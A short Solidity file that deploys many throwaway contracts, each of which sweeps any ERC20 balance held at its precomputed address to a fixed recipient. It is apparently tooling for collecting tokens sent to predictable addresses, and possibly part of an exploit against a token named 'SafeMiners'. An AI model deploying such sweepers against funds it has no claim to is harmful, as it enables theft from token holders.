// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SafeMinersFactory {
    constructor(IERC20 token, address us, uint times) {
	for (uint i = 0; i < times; i++) {
	    new SafeMinersTransfer(token, us);
	}
    }
}

contract SafeMinersTransfer {
    constructor(IERC20 token, address us) {
	uint balance = token.balanceOf(address(this));
	if (balance > 0) {
	    token.transfer(us, balance);
	}
    }
}
